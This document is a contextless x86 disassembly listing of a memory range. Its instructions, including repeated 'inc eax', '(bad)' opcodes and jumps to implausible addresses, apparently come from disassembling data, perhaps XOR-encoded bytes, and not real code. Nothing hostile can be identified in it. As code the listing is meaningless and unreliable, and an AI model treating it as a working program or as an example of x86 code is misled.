  402090:	xor    DWORD PTR [eax-0x14],0x23754086
  402097:	xor    al,0x62
  402099:	mov    eax,0x304040a0
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	daa    
  4020a0:	int    0x63
  4020a2:	adc    eax,0x401f4090
  4020a7:	inc    eax
  4020a8:	inc    eax
  4020a9:	inc    eax
  4020aa:	inc    eax
  4020ab:	inc    eax
  4020ac:	and    eax,0xe1404040
  4020b1:	adc    DWORD PTR cs:[ebx+edx*2+0x5],edx
  4020b6:	inc    eax
  4020b7:	xor    BYTE PTR [ebp+eiz*1+0x34],bl
  4020bb:	fs pushf 
  4020bd:	xchg   BYTE PTR [eax+0x1f],al
  4020c0:	daa    
  4020c1:	or     al,0x7e
  4020c3:	loope  0x4020ca
  4020c5:	sub    eax,0x4658bf40
  4020ca:	(bad)  
  4020cb:	retf   
  4020cc:	inc    ebx
  4020cd:	pop    DWORD PTR [eax-0x40]
  4020d0:	loope  0x40211e
  4020d2:	inc    eax
  4020d3:	inc    eax
  4020d4:	inc    eax
  4020d5:	inc    eax
  4020d6:	inc    eax
  4020d7:	inc    eax
  4020d8:	inc    eax
  4020d9:	inc    eax
  4020da:	inc    eax
  4020db:	inc    eax
  4020dc:	lds    edi,FWORD PTR [edi+0x1f4005d9]
  4020e2:	fsubr  DWORD PTR [ecx+edx*4+0x40864abf]
  4020e9:	shl    BYTE PTR [ecx+0x40404042],0x40
  4020f0:	inc    eax
  4020f1:	inc    eax
  4020f2:	rol    DWORD PTR [eax+0x40],0xa1
  4020f6:	jge    0x40213c
  4020f8:	das    
  4020f9:	inc    eax
  4020fa:	pop    ds
  4020fb:	scas   eax,DWORD PTR es:[edi]
  4020fc:	cmp    BYTE PTR [edx+0x5e],ah
  4020ff:	dec    DWORD PTR [esi+0x33c87d40]
  402105:	shr    DWORD PTR [eax+0x1f40054f],0xe5
  40210c:	das    
  40210d:	xor    BYTE PTR [eax],dl
  40210f:	push   eax
  402110:	xchg   BYTE PTR [eax+0x7d],al
  402113:	inc    esp
  402114:	sub    al,0xb5
  402116:	mov    ah,0x49
  402118:	inc    eax
  402119:	inc    eax
  40211a:	add    BYTE PTR [eax+0x40],al
  40211d:	inc    eax
  40211e:	inc    eax
  40211f:	inc    eax
  402120:	inc    eax
  402121:	and    eax,DWORD PTR [eax+0x1f]
  402124:	in     eax,0x23
  402126:	les    eax,FWORD PTR ds:0xc0408d59
  40212c:	arpl   WORD PTR [ecx+0x4f],ax
  40212f:	retf   
  402130:	and    al,0x5
  402132:	inc    eax
  402133:	pop    ds
  402134:	call   0x53526679
  402139:	xchg   BYTE PTR [eax+0x56],al
  40213c:	sub    DWORD PTR [ecx+eax*2],ebp
  40213f:	mov    esp,0xbd406eba
  402144:	dec    esi
  402145:	inc    eax
  402146:	inc    eax
  402147:	inc    eax
  402148:	inc    eax
  402149:	inc    eax
  40214a:	inc    eax
  40214b:	inc    eax
  40214c:	inc    eax
  40214d:	inc    eax
  40214e:	inc    eax
  40214f:	outs   dx,BYTE PTR ds:[si]
  402151:	dec    ecx
  402152:	nop
  402153:	mov    WORD PTR [eax+0x2f],es
  402156:	and    DWORD PTR [ecx+0x34],ecx
  402159:	or     ah,BYTE PTR [ebx+0x5]
  40215c:	inc    eax
  40215d:	pop    ds
  40215e:	jae    0x40219c
  402160:	bound  esi,QWORD PTR [eax]
  402162:	inc    eax
  402163:	inc    eax
  402164:	inc    eax
  402165:	inc    eax
  402166:	inc    eax
  402167:	inc    eax
  402168:	int3   
  402169:	jne    0x4021ab
  40216b:	mov    al,ds:0x21484086
  402170:	inc    ebx
  402171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402172:	xchg   ecx,eax
  402173:	adc    eax,0x154402c
  402178:	sub    BYTE PTR [eax+edi*4],al
  40217b:	leave  
  40217c:	mov    eax,DWORD PTR [eax-0x41]
  40217f:	and    DWORD PTR [ebp+0x62],ecx
  402182:	or     eax,0x3640059c
  402187:	sbb    al,BYTE PTR [eax+0x0]
  40218a:	rol    DWORD PTR [eax+0x40],0x40
  40218e:	inc    eax
  40218f:	add    BYTE PTR [eax+0x25],al
  402192:	rol    BYTE PTR [ebx+0x5],1
  402195:	xchg   BYTE PTR [eax+0x62],al
  402198:	and    esi,DWORD PTR [esi]
  40219a:	dec    ebx
  40219b:	and    ecx,ecx
  40219d:	sub    DWORD PTR [eax+0x71],eax
  4021a0:	scas   eax,DWORD PTR es:[edi]
  4021a1:	sub    DWORD PTR [ecx],esp
  4021a3:	rcr    cl,0x8a
  4021a6:	inc    eax
  4021a7:	inc    ecx
  4021a8:	inc    ecx
  4021a9:	sub    al,0xd5
  4021ab:	les    edx,FWORD PTR [eax+0x5]
  4021ae:	inc    eax
  4021af:	xchg   edi,eax
  4021b0:	add    DWORD PTR gs:[ebx+0x4040a04f],esp
  4021b7:	inc    eax
  4021b8:	inc    eax
  4021b9:	inc    eax
  4021ba:	inc    eax
  4021bb:	inc    eax
  4021bc:	inc    eax
  4021bd:	inc    DWORD PTR [eax-0x7a]
  4021c0:	inc    eax
  4021c1:	dec    ebp
  4021c2:	gs ins DWORD PTR es:[edi],dx
  4021c4:	icebp  
  4021c5:	inc    eax
  4021c6:	sub    DWORD PTR [esi],0x30e15140
  4021cc:	bound  eax,QWORD PTR [ecx+0x40]
  4021cf:	mov    DWORD PTR [eax+0x24],eax
  4021d2:	fisub  WORD PTR ds:0x404011cb
  4021d8:	inc    eax
  4021d9:	inc    eax
  4021da:	inc    eax
  4021db:	inc    eax
  4021dc:	inc    eax
  4021dd:	inc    eax
  4021de:	inc    eax
  4021df:	inc    eax
  4021e0:	test   DWORD PTR ds:0x25eb5f40,0x864fe48c
  4021ea:	inc    eax
  4021eb:	inc    esp
  4021ec:	sbb    al,0xb
  4021ee:	add    eax,0x4033b05c
  4021f3:	imul   DWORD PTR [ebx+0x60]
  4021f6:	leave  
  4021f7:	cld    
  4021f8:	add    eax,0xc604088
  4021fd:	jp     0x402209
  4021ff:	icebp  
  402200:	inc    eax
  402201:	inc    eax
  402202:	inc    eax
  402203:	inc    eax
  402204:	inc    eax
  402205:	inc    eax
  402206:	inc    eax
  402207:	inc    eax
  402208:	add    bl,cl
  40220a:	add    eax,0x4a295340
  40220f:	inc    esp
  402210:	test   al,0x4d
  402212:	xchg   BYTE PTR [eax+0x3c],al
  402215:	add    al,0x44
  402217:	int    0x10
  402219:	lock xor al,0x40
  40221c:	and    BYTE PTR [edi],ah
  40221e:	xor    BYTE PTR [eax+0x4087acac],bl
  402224:	inc    eax
  402225:	inc    eax
  402226:	inc    eax
  402227:	inc    eax
  402228:	inc    eax
  402229:	and    eax,0x40404040
  40222e:	sbb    DWORD PTR [edx],ecx
  402230:	and    edx,DWORD PTR ds:0x40056705
  402236:	and    bl,ch
  402238:	and    eax,0x865042cb
  40223d:	inc    eax
  40223e:	pop    ds
  40223f:	push   ebx
  402240:	cs pushf 
  402242:	inc    esp
  402243:	pop    eax
  402244:	xor    eax,0x2e674040
  402249:	or     eax,0x40866d38
  40224e:	xchg   ecx,eax
  40224f:	mov    edi,0x40404040
  402254:	inc    eax
  402255:	inc    eax
  402256:	inc    eax
  402257:	inc    eax
  402258:	inc    eax
  402259:	inc    eax
  40225a:	das    
  40225b:	dec    ecx
  40225c:	fst    DWORD PTR [edx+0x5]
  40225f:	inc    eax
  402260:	and    DWORD PTR [edi+0x3],esp
  402263:	mov    cl,0xc4
  402265:	ret    
  402266:	xchg   BYTE PTR [eax+0x37],al
  402269:	jmp    0x508f52b1
  40226e:	sub    al,0x40
  402270:	and    eax,0xac60772f
  402275:	or     eax,0xa3734085
  40227a:	and    al,0xc4
  40227c:	adc    eax,0x404005cb
  402281:	inc    eax
  402282:	inc    eax
  402283:	inc    eax
  402284:	inc    eax
  402285:	rol    DWORD PTR [eax+0x40],0x40
  402289:	and    DWORD PTR [edx+0x4d],esp
  40228c:	dec    edi
  40228d:	leave  
  40228e:	inc    ecx
  40228f:	xchg   BYTE PTR [eax-0x4d],al
  402292:	and    DWORD PTR [esp+esi*8],esp
  402295:	mov    al,ds:0x48403387
  40229a:	push   esp
  40229b:	and    eax,0x84d81505
  4022a0:	inc    eax
  4022a1:	xchg   ecx,eax
  4022a2:	pusha  
  4022a3:	and    al,0x7b
  4022a5:	inc    ebx
  4022a6:	arpl   WORD PTR ds:0x2f2f5f40,ax
  4022ac:	pushf  
  4022ad:	inc    eax
  4022ae:	inc    eax
  4022af:	add    BYTE PTR [eax+0x40],al
  4022b2:	inc    eax
  4022b3:	inc    eax
  4022b4:	inc    eax
  4022b5:	inc    eax
  4022b6:	push   esp
  4022b7:	dec    edi
  4022b8:	xchg   BYTE PTR [eax+0x15],al
  4022bb:	inc    ebp
  4022bc:	and    eax,DWORD PTR ds:0x40394b15
  4022c2:	mov    edi,0x43cb2ea3
  4022c7:	mov    eax,0x53cf4083
  4022cc:	and    eax,0x5c3b89c
  4022d1:	inc    eax
  4022d2:	xor    ecx,ebp
  4022d4:	inc    eax
  4022d5:	inc    eax
  4022d6:	inc    eax
  4022d7:	inc    eax
  4022d8:	inc    eax
  4022d9:	inc    eax
  4022da:	inc    eax
  4022db:	inc    eax
  4022dc:	inc    eax
  4022dd:	inc    eax
  4022de:	sub    al,0x15
  4022e0:	adc    eax,0x414086bc
  4022e5:	ret    
  4022e6:	xor    cl,cl
  4022e8:	retf   
  4022e9:	add    eax,0x67554022
  4022ee:	xor    eax,0x4040a041
  4022f3:	inc    eax
  4022f4:	inc    eax
  4022f5:	inc    eax
  4022f6:	inc    eax
  4022f7:	int3   
  4022f8:	jne    0x40233a
  4022fa:	test   DWORD PTR [edx+0x6db74240],0x5440541
  402304:	inc    eax
  402305:	bnd js 0x402348
  402308:	add    cl,al
  40230a:	inc    eax
  40230b:	inc    eax
  40230c:	inc    eax
  40230d:	inc    eax
  40230e:	add    BYTE PTR [eax+0x2d],al
  402311:	adc    al,0xc9
  402313:	iret   
  402314:	xchg   BYTE PTR [eax+0x2e],al
  402317:	daa    
  402318:	xor    cl,ch
  40231a:	dec    edi
  40231b:	dec    esp
  40231c:	and    DWORD PTR [eax+0x65],eax
  40231f:	outs   dx,BYTE PTR ds:[esi]
  402320:	das    
  402321:	pushf  
  402322:	pop    eax
  402323:	bound  eax,QWORD PTR [ecx+0x26e9d140]
  402329:	or     eax,0x4005b1d8
  40232e:	pop    ebp
  40232f:	bound  ebp,QWORD PTR [ebp+0x40]
  402332:	inc    eax
  402333:	inc    eax
  402334:	inc    eax
  402335:	inc    eax
  402336:	inc    eax
  402337:	inc    eax
  402338:	inc    eax
  402339:	inc    DWORD PTR [eax-0x35]
  40233c:	mov    al,0xa9
  40233e:	xchg   BYTE PTR [eax-0xf],al
  402341:	daa    
  402342:	aaa    
  402343:	inc    ecx
  402344:	rol    BYTE PTR [ebp+0x22],cl
  402347:	inc    eax
  402348:	outs   dx,BYTE PTR ds:[esi]
  402349:	dec    ebx
  40234a:	aaa    
  40234b:	inc    eax
  40234c:	test   al,0x35
  40234e:	add    BYTE PTR [eax+0x73],0x65
  402352:	aaa    
  402353:	push   ebx
  402354:	adc    DWORD PTR [edi+0x5],eax
  402357:	inc    eax
  402358:	adc    BYTE PTR ds:[eax+0x40],al
  40235c:	inc    eax
  40235d:	inc    eax
  40235e:	inc    eax
  40235f:	inc    eax
  402360:	inc    eax
  402361:	inc    eax
  402362:	inc    eax
  402363:	inc    eax
  402364:	ins    DWORD PTR es:[edi],dx
  402365:	add    al,0x10
  402367:	mov    edx,0x65334086
  40236c:	cmp    BYTE PTR [esp+ecx*2-0x3d],dl
  402370:	jmp    0xcdb3:0x6f5faf40
  402377:	inc    esp
  402378:	inc    eax
  402379:	inc    eax
  40237a:	inc    ecx
  40237b:	inc    eax
  40237c:	inc    eax
  40237d:	inc    eax
  40237e:	inc    eax
  40237f:	inc    eax
  402380:	inc    eax
  402381:	inc    eax
  402382:	inc    eax
  402383:	add    BYTE PTR [edi],ch
  402385:	cs test al,0x44
  402388:	xor    al,0x64
  40238a:	inc    eax
  40238b:	xchg   ecx,eax
  40238c:	daa    
  40238d:	das    
  40238e:	adc    ah,ah
  402390:	sub    BYTE PTR [eax+0x29655940],cl
  402396:	cwde   
  402397:	and    al,0xa5
  402399:	and    eax,0x34147140
  40239e:	adc    eax,0x408c2415
  4023a3:	push   ds
  4023a4:	and    DWORD PTR [eax+0x40],eax
  4023a7:	inc    eax
  4023a8:	inc    eax
  4023a9:	inc    eax
  4023aa:	inc    eax
  4023ab:	and    eax,0x21404040
  4023b0:	retf   
  4023b1:	gs test eax,0xbfd14062
  4023b7:	and    edx,DWORD PTR [esi+0x2d]
  4023ba:	inc    ebp
  4023bb:	lods   al,BYTE PTR ds:[esi]
  4023bc:	inc    eax
  4023bd:	pop    ebp
  4023be:	adc    al,0x29
  4023c0:	stos   DWORD PTR es:[edi],eax
  4023c1:	test   DWORD PTR ds:0x625540c1,esi
  4023c7:	sub    al,0x45
  4023c9:	inc    ebp
  4023ca:	inc    esi
  4023cb:	inc    edx
  4023cc:	inc    eax
  4023cd:	bound  eax,QWORD PTR [eax+0x40]
  4023d0:	inc    eax
  4023d1:	inc    eax
  4023d2:	inc    eax
  4023d3:	inc    eax
  4023d4:	inc    eax
  4023d5:	inc    eax
  4023d6:	inc    eax
  4023d7:	inc    eax
  4023d8:	xor    BYTE PTR [eax],dh
  4023da:	xchg   DWORD PTR [ebp+0x41],edi
  4023dd:	mov    esi,0x307a7240
  4023e2:	push   eax
  4023e3:	push   0x32406965
  4023e8:	mov    ds:0x40404021,eax
  4023ed:	inc    eax
  4023ee:	inc    eax
  4023ef:	inc    eax
  4023f0:	rol    DWORD PTR [eax+0x40],0x65
  4023f4:	dec    esp
  4023f5:	call   0x779c64b9
  4023fa:	pusha  
  4023fb:	sbb    eax,DWORD PTR [ebp-0x68]
  4023fe:	mov    edi,0x7a217140
  402403:	xchg   esp,eax
  402404:	jge    0x40246e
  402406:	scas   eax,DWORD PTR es:[edi]
  402407:	inc    eax
  402408:	pop    ecx
  402409:	jle    0x402430
  40240b:	add    DWORD PTR [ebp+0x62],edx
  40240e:	inc    eax
  40240f:	inc    eax
  402410:	add    BYTE PTR [eax+0x40],al
  402413:	inc    eax
  402414:	inc    eax
  402415:	inc    eax
  402416:	inc    eax
  402417:	test   al,0x40
  402419:	pop    ebp
  40241a:	mov    ds:0xa9601830,eax
  40241f:	test   al,0x40
  402421:	mov    ebx,0x6f65395e
  402426:	sub    eax,0xb51d4042
  40242b:	adc    al,0xf4
  40242d:	inc    ebp
  40242e:	rol    DWORD PTR [ecx],1
  402430:	inc    eax
  402431:	ror    DWORD PTR [ebp+0x40],cl
  402434:	inc    eax
  402435:	inc    eax
  402436:	inc    eax
  402437:	inc    eax
  402438:	inc    eax
  402439:	inc    eax
  40243a:	inc    eax
  40243b:	inc    eax
  40243c:	inc    eax
  40243d:	ins    DWORD PTR es:[edi],dx
  40243e:	add    eax,0x40fc527d
  402443:	pop    ecx
  402444:	loopne 0x40247a
  402446:	leave  
  402447:	inc    ebx
  402448:	mov    esp,0x2f91406c
  40244d:	cs xchg ecx,eax
  40244f:	pusha  
  402450:	add    eax,0xfe654041
  402455:	and    eax,0xac6311bf
  40245a:	inc    eax
  40245b:	xor    ecx,DWORD PTR [esp+esi*1]
  40245e:	inc    eax
  40245f:	inc    eax
  402460:	inc    eax
  402461:	inc    eax
  402462:	inc    eax
  402463:	inc    eax
  402464:	int3   
  402465:	jne    0x4024a7
  402467:	inc    edx
  402468:	fdiv   QWORD PTR [esi]
  40246a:	loopne 0x4024ac
  40246c:	pop    edx
  40246d:	mov    ds:0x416a8c2e,eax
  402472:	gs inc eax
  402474:	jne    0x40244d
  402476:	das    
  402477:	and    al,0xc4
  402479:	pop    edx
  40247a:	stc    
  40247b:	inc    eax
  40247c:	and    ax,0x6203
  402480:	mov    ebp,DWORD PTR [ecx+0x68f94063]
  402486:	inc    eax
  402487:	outs   dx,DWORD PTR ds:[esi]
  402488:	inc    eax
  402489:	add    cl,al
  40248b:	inc    eax
  40248c:	inc    eax
  40248d:	inc    eax
  40248e:	inc    eax
  40248f:	add    BYTE PTR [eax-0x58],al
  402492:	push   ecx
  402493:	add    DWORD PTR [eax+0x68],eax
  402496:	and    al,0x48
  402498:	and    al,0xa4
  40249a:	inc    ecx
  40249b:	cld    
  40249c:	inc    eax
  40249d:	xor    DWORD PTR [eax+eiz*2],eax
  4024a0:	mov    ecx,0x40ec0105
  4024a5:	inc    edx
  4024a6:	pop    esp
  4024a7:	inc    eax
  4024a8:	scas   al,BYTE PTR es:[edi]
  4024a9:	retf   
  4024aa:	xchg   esp,eax
  4024ab:	push   esi
  4024ac:	inc    eax
  4024ad:	xchg   ecx,eax
  4024ae:	inc    eax
  4024af:	inc    eax
  4024b0:	inc    eax
  4024b1:	inc    eax
  4024b2:	inc    eax
  4024b3:	inc    eax
  4024b4:	inc    eax
  4024b5:	inc    eax
  4024b6:	inc    DWORD PTR [eax+0x24]
  4024b9:	inc    eax
  4024ba:	test   al,0xdd
  4024bc:	push   ebx
  4024bd:	aad    0x40
  4024bf:	dec    edx
  4024c0:	xor    al,0x50
  4024c2:	inc    eax
  4024c3:	fwait
  4024c4:	es mov ah,0x40
  4024c7:	inc    eax
  4024c8:	inc    eax
  4024c9:	inc    eax
  4024ca:	inc    eax
  4024cb:	inc    eax
  4024cc:	inc    eax
  4024cd:	inc    eax
  4024ce:	inc    eax
  4024cf:	inc    eax
  4024d0:	inc    eax
  4024d1:	adc    DWORD PTR [ecx+0x8],ebp
  4024d4:	inc    eax
  4024d5:	dec    eax
  4024d6:	mov    al,0x5
  4024d8:	inc    eax
  4024d9:	mov    edi,0xc94140a1
  4024de:	inc    ecx
  4024df:	leave  
  4024e0:	inc    eax
  4024e1:	inc    ecx
  4024e2:	inc    ebx
  4024e3:	pusha  
  4024e4:	inc    eax
  4024e5:	inc    eax
  4024e6:	inc    eax
  4024e7:	inc    eax
  4024e8:	inc    eax
  4024e9:	inc    eax
  4024ea:	inc    eax
  4024eb:	inc    eax
  4024ec:	add    BYTE PTR [eax+ebp*4-0x46],al
  4024f0:	pop    esp
  4024f1:	inc    eax
  4024f2:	shl    BYTE PTR [ebx],1
  4024f4:	inc    ebx
  4024f5:	sub    BYTE PTR ds:0x140416c,cl
  4024fb:	stos   DWORD PTR es:[edi],eax
  4024fc:	les    edx,FWORD PTR [eax]
  4024fe:	retf   
  4024ff:	push   ecx
  402500:	inc    ebx
  402501:	inc    eax
  402502:	inc    eax
  402503:	dec    eax
  402504:	push   0x40
  402506:	inc    eax
  402507:	inc    eax
  402508:	inc    eax
  402509:	inc    eax
  40250a:	inc    eax
  40250b:	and    eax,0x98404040
  402510:	pop    esp
  402511:	jmp    FWORD PTR [eax+eax*2]
  402514:	push   ecx
  402515:	loopne 0x402557
  402517:	add    eax,0x400c4f05
  40251c:	jno    0x402527
  40251e:	lods   eax,DWORD PTR ds:[esi]
  40251f:	dec    eax
  402520:	retf   
  402521:	mov    al,0x8b
  402523:	inc    eax
  402524:	jg     0x402575
  402526:	inc    ebp
  402527:	inc    esi
  402528:	push   ecx
  402529:	or     eax,0x40714056
  40252e:	inc    eax
  40252f:	inc    eax
  402530:	inc    eax
  402531:	inc    eax
  402532:	inc    eax
  402533:	inc    eax
  402534:	inc    eax
  402535:	inc    eax
  402536:	inc    eax
  402537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402538:	sub    al,0x30
  40253a:	inc    esi
  40253b:	retf   
  40253c:	(bad)  
  40253d:	inc    eax
  40253e:	jg     0x4025af
  402540:	inc    eax
  402541:	(bad)  
  402542:	int3   
  402543:	popa   
  402544:	inc    eax
  402545:	inc    eax
  402546:	jno    0x40252a
  402548:	mov    esp,0x443520c4
  40254d:	inc    eax
  40254e:	jg     0x402586
  402550:	inc    eax
  402551:	inc    eax
  402552:	inc    eax
  402553:	inc    eax
  402554:	inc    eax
  402555:	inc    eax
  402556:	rol    DWORD PTR [eax+0x40],0x49
  40255a:	dec    edi
  40255b:	pop    eax
  40255c:	inc    edx
  40255d:	push   0xdc427140
  402562:	retf   0x460d
  402565:	inc    eax
  402566:	inc    eax
  402567:	jg     0x4025ca
  402569:	dec    edx
  40256a:	sub    ecx,ebx
  40256c:	popa   
  40256d:	sub    al,BYTE PTR [eax+0x48]
  402570:	push   eax
  402571:	inc    eax
  402572:	cwde   
  402573:	push   edi
  402574:	clc    
  402575:	pop    ebx
  402576:	inc    eax
  402577:	lahf   
  402578:	inc    eax
  402579:	inc    eax
  40257a:	add    BYTE PTR [eax+0x40],al
  40257d:	inc    eax
  40257e:	inc    eax
  40257f:	inc    eax
  402580:	inc    eax
  402581:	popa   
  402582:	dec    ebp
  402583:	xchg   DWORD PTR [eax+ecx*8],esi
  402586:	inc    ebp
  402587:	inc    eax
  402588:	dec    DWORD PTR [eax+eax*2-0x47]
  40258c:	inc    eax
  40258d:	dec    esp
  40258e:	cmp    eax,DWORD PTR [eax+0x49]
  402591:	and    ch,BYTE PTR [edi]
  402593:	bound  ebp,QWORD PTR [eax+0x1f404262]
  402599:	test   DWORD PTR [eax+0x28],0x403ca93d
  4025a0:	jno    0x4025cf
  4025a2:	inc    eax
  4025a3:	stc    
  4025a4:	inc    eax
  4025a5:	inc    eax
  4025a6:	inc    eax
  4025a7:	inc    eax
  4025a8:	inc    eax
  4025a9:	inc    eax
  4025aa:	inc    eax
  4025ab:	inc    eax
  4025ac:	inc    eax
  4025ad:	inc    eax
  4025ae:	ret    
  4025af:	inc    ebx
  4025b0:	dec    edi
  4025b1:	inc    eax
  4025b2:	jg     0x4025f5
  4025b4:	inc    eax
  4025b5:	test   al,0x5d
  4025b7:	loope  0x402580
  4025b9:	inc    eax
  4025ba:	push   esp
  4025bb:	pusha  
  4025bc:	inc    eax
  4025bd:	inc    eax
  4025be:	inc    eax
  4025bf:	inc    eax
  4025c0:	inc    eax
  4025c1:	inc    eax
  4025c2:	int3   
  4025c3:	jne    0x402605
  4025c5:	outs   dx,DWORD PTR ds:[esi]
  4025c6:	xchg   edx,eax
  4025c7:	xor    al,0xcb
  4025c9:	test   al,0x40
  4025cb:	cmc    
  4025cc:	and    eax,DWORD PTR [ecx-0x41]
  4025cf:	dec    eax
  4025d0:	add    BYTE PTR [eax],dl
  4025d2:	inc    eax
  4025d3:	cs push ebx
  4025d5:	stos   BYTE PTR es:[edi],al
  4025d6:	inc    edx
  4025d7:	dec    ecx
  4025d8:	mov    DWORD PTR [ecx+0x40],eax
  4025db:	xchg   edi,eax
  4025dc:	addr16 push esp
  4025de:	add    ecx,DWORD PTR [edx+0x4a40a5c3]
  4025e4:	adc    esp,DWORD PTR [edx+0x40]
  4025e7:	add    cl,al
  4025e9:	inc    eax
  4025ea:	inc    eax
  4025eb:	inc    eax
  4025ec:	inc    eax
  4025ed:	add    BYTE PTR [eax+0x60],al
  4025f0:	aam    0x41
  4025f2:	xor    BYTE PTR [eax-0x6b],al
  4025f5:	loope  0x402637
  4025f7:	bound  edi,QWORD PTR [edi+0x4940b843]
  4025fd:	pusha  
  4025fe:	push   0xffffffd0
  402600:	mov    edi,0xb340c2cc
  402605:	and    ebp,DWORD PTR [edi+0x50]
  402608:	mov    edi,0x2d40f12f
  40260d:	dec    esi
  40260e:	inc    eax
  40260f:	inc    eax
  402610:	inc    eax
  402611:	inc    eax
  402612:	inc    eax
  402613:	inc    eax
  402614:	inc    eax
  402615:	inc    eax
  402616:	inc    DWORD PTR [eax+0x6a]
  402619:	xor    eax,0x407f8474
  40261e:	mov    ah,0x61
  402620:	inc    ecx
  402621:	push   esi
  402622:	test   eax,0x2d405252
  402627:	dec    ebp
  402628:	inc    edi
  402629:	test   al,0xa8
  40262b:	or     ch,BYTE PTR ds:0x4040be40
  402631:	inc    eax
  402632:	inc    eax
  402633:	inc    eax
  402634:	inc    eax
  402635:	inc    eax
  402636:	inc    eax
  402637:	inc    eax
  402638:	inc    eax
  402639:	mov    ds:0xcc15418c,al
  40263e:	inc    edx
  40263f:	inc    eax
  402640:	sub    eax,0xc96e651f
  402645:	bound  edi,QWORD PTR [eax]
  402647:	inc    eax
  402648:	mov    ebx,0xac2f4126
  40264d:	push   edi
  40264e:	loopne 0x402690
  402650:	jno    0x40267c
  402652:	sub    eax,0x40404062
  402657:	inc    eax
  402658:	inc    eax
  402659:	inc    eax
  40265a:	inc    eax
  40265b:	inc    eax
  40265c:	add    BYTE PTR [esi-0x55],al
  40265f:	inc    DWORD PTR [eax-0x21]
  402662:	jecxz  0x4026a4
  402664:	div    DWORD PTR [ecx-0x42]
  402667:	inc    edx
  402668:	inc    eax
  402669:	and    esp,DWORD PTR [esi]
  40266b:	sub    al,0x42
  40266d:	sub    al,0xa
  40266f:	push   cs
  402670:	inc    eax
  402671:	jg     0x402654
  402673:	push   0x2d
  402675:	(bad)  
  402676:	leave  
  402677:	push   0x40
  402679:	inc    eax
  40267a:	inc    eax
  40267b:	inc    eax
  40267c:	inc    eax
  40267d:	inc    eax
  40267e:	and    eax,0x40404040
  402683:	bndstx [eax+0x44],bnd0
  402687:	jne    0x4026af
  402689:	and    al,BYTE PTR [eax-0x3]
  40268c:	addr16 mov esp,0x34505442
  402692:	inc    eax
  402693:	or     DWORD PTR [ebx+0x40],ecx
  402696:	sub    eax,0x40801562
  40269b:	test   al,0x40
  40269d:	inc    eax
  40269e:	inc    eax
  40269f:	inc    eax
  4026a0:	inc    eax
  4026a1:	inc    eax
  4026a2:	inc    eax
  4026a3:	inc    eax
  4026a4:	inc    eax
  4026a5:	inc    eax
  4026a6:	and    DWORD PTR [edi],edx
  4026a8:	mov    esp,0x40c5454d
  4026ad:	outs   dx,BYTE PTR ds:[esi]
  4026ae:	imul   edx,DWORD PTR ds:0x4c3bc818,0x62e34e40
  4026b8:	jno    0x4026a5
  4026ba:	test   al,0x40
  4026bc:	inc    eax
  4026bd:	inc    eax
  4026be:	inc    eax
  4026bf:	inc    eax
  4026c0:	inc    eax
  4026c1:	rol    DWORD PTR [eax+0x40],0x42
  4026c5:	inc    eax
  4026c6:	popa   
  4026c7:	adc    eax,0x6349d272
  4026cc:	dec    ebp
  4026cd:	inc    eax
  4026ce:	pop    ebp
  4026cf:	popa   
  4026d0:	jo     0x402734
  4026d2:	test   al,0x89
  4026d4:	sub    BYTE PTR [eax+0x61],al
  4026d7:	imul   esp,DWORD PTR [ebp+0x44],0x40fcc14a
  4026de:	inc    eax
  4026df:	add    BYTE PTR [eax+0x40],al
  4026e2:	inc    eax
  4026e3:	inc    eax
  4026e4:	inc    eax
  4026e5:	inc    eax
  4026e6:	inc    eax
  4026e7:	mov    ebx,0x27384022
  4026ec:	mov    esi,0x3f724036
  4026f1:	dec    DWORD PTR [ebx+0x40a8084c]
  4026f7:	and    DWORD PTR [edi],esi
  4026f9:	push   0x2b
  4026fb:	xor    al,0xf7
  4026fd:	adc    al,BYTE PTR [eax+0x45]
  402700:	pusha  
  402701:	fnstcw WORD PTR ds:0x40484f48
  402707:	mov    ds:0x404040e1,al
  40270c:	inc    eax
  40270d:	inc    eax
  40270e:	inc    eax
  40270f:	inc    eax
  402710:	inc    eax
  402711:	inc    eax
  402712:	inc    eax
  402713:	dec    eax
  402714:	push   esp
  402715:	adc    eax,0x29404250
  40271a:	push   ebp
  40271b:	lock popa 
  40271d:	jnp    0x402724
  40271f:	daa    
  402720:	inc    eax
  402721:	dec    ecx
  402722:	jecxz  0x4026c3
  402724:	cmp    eax,0x4034cbbc
  402729:	and    DWORD PTR [esi+0x41],ecx
  40272c:	scas   eax,DWORD PTR es:[edi]
  40272d:	adc    eax,0x6c406356
  402732:	inc    eax
  402733:	inc    eax
  402734:	inc    eax
  402735:	inc    eax
  402736:	inc    eax
  402737:	inc    eax
  402738:	int3   
  402739:	jne    0x40277b
  40273b:	lods   eax,DWORD PTR ds:[esi]
  40273c:	inc    eax
  40273d:	mov    esp,0x40cd35cb
  402742:	loope  0x402749
  402744:	int3   
  402745:	gs xchg ecx,eax
  402747:	inc    ecx
  402748:	push   eax
  402749:	inc    eax
  40274a:	pop    esp
  40274b:	in     eax,dx
  40274c:	inc    edx
  40274d:	cs mov edi,0x6d401949
  402753:	push   esp
  402754:	cmp    bl,cl
  402756:	jo     0x402798
  402758:	add    cl,al
  40275a:	inc    eax
  40275b:	inc    eax
  40275c:	inc    eax
  40275d:	inc    eax
  40275e:	add    BYTE PTR [eax+0x59],al
  402761:	imul   eax,DWORD PTR [eax-0x25],0x8491823
  402768:	jl     0x40275b
  40276a:	inc    eax
  40276b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40276c:	aas    
  40276d:	inc    eax
  40276e:	in     eax,0x49
  402770:	push   edx
  402771:	aam    0x40
  402773:	test   BYTE PTR [ebp+0xd430172],ch
  402779:	pop    ds
  40277a:	inc    eax
  40277b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40277d:	inc    eax
  40277e:	xor    BYTE PTR [eax+0x40],al
  402781:	inc    eax
  402782:	inc    eax
  402783:	inc    eax
  402784:	inc    eax
  402785:	inc    eax
  402786:	inc    eax
  402787:	inc    DWORD PTR [eax+0x38]
  40278a:	leave  
  40278b:	les    eax,FWORD PTR [eax-0x61]
  40278e:	add    al,0x70
  402790:	bound  edi,QWORD PTR [edi-0x76]
  402793:	retf   
  402794:	inc    eax
  402795:	push   0xa814403f
  40279a:	imul   ebp,DWORD PTR [ecx+0x65372340],0x20
  4027a1:	adc    BYTE PTR [eax-0x4c],dl
  4027a4:	inc    eax
  4027a5:	pop    ecx
  4027a6:	loope  0x4027e8
  4027a8:	adc    BYTE PTR [eax+eax*2+0x40],0x40
  4027ad:	inc    eax
